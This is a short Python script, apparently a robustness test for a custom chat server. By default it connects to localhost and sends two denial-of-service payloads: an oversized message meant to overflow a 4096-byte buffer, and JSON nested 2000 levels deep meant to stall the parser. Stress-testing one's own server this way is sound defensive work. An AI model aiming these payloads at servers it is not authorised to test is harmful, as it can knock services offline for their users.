import asyncio
import json
import argparse
import random

# 1. 4096바이트를 초과하는 거대 메시지 생성 (Buffer Overflow/Memory Stress)
def make_huge_payload(size: int = 5000) -> bytes:
    # 대량의 데이터 생성
    garbage_text = "A" * size
    body = json.dumps({
        "type": "message",
        "text": garbage_text,
        "note": "Testing buffer limits > 4096"
    }).encode("utf-8")
    
    # 헤더는 데이터의 실제 길이를 16진수로 표현 (4자)
    header = f"{len(body):04x}".encode("utf-8")
    return header + body

# 2. 깊은 JSON Depth 생성 (Stack Overflow/Parser Denial of Service)
def make_deep_json_payload(depth: int = 1000) -> bytes:
    # {'a': {'a': {'a': ...}}} 구조 생성
    root = {}
    current = root
    for _ in range(depth):
        current["child"] = {}
        current = current["child"]
    
    body = json.dumps({
        "type": "join",
        "user_name": "depth_attacker",
        "channel_id": 1,
        "attack_data": root
    }).encode("utf-8")
    
    header = f"{len(body):04x}".encode("utf-8")
    return header + body

async def run_attack(host, port):
    print(f"[*] Targeting {host}:{port}...")
    try:
        reader, writer = await asyncio.open_connection(host, port)
        
        # 공격 1: 4096바이트 초과 메시지 전송
        print("[!] Sending huge payload (8192 bytes)...")
        writer.write(make_huge_payload(8192))
        await writer.drain()
        await asyncio.sleep(1)

        # 공격 2: 깊은 JSON Depth 전송 (파서 마비 유도)
        print("[!] Sending deep JSON payload (Depth: 2000)...")
        writer.write(make_deep_json_payload(2000))
        await writer.drain()
        
        print("[*] Payloads sent. Checking server response...")
        
        # 서버가 죽었는지 혹은 에러를 보내는지 확인
        try:
            response = await asyncio.wait_for(reader.read(1024), timeout=5.0)
            print(f"[*] Server response: {response.decode(errors='ignore')}")
        except asyncio.TimeoutError:
            print("[?] No response from server (Possible hang?)")

        writer.close()
        await writer.wait_closed()
        
    except Exception as e:
        print(f"[x] Connection failed or closed by server: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=4800)
    args = parser.parse_args()

    asyncio.run(run_attack(args.host, args.port))